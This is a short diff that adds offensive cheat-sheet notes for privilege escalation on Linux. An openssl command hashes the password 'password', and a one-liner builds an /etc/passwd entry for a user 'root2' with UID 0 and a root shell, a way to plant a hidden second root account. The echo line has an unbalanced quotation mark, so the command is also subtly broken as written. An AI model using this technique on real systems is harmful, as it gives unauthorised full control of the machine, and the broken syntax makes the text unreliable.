@@ -1,0 +1,4 @@
+openssl passwd -1 -salt root2 password
+
+one liner
+`echo "root2:$(openssl passwd -1 -salt root2 password):0:0:root:/root:/bin/bash`
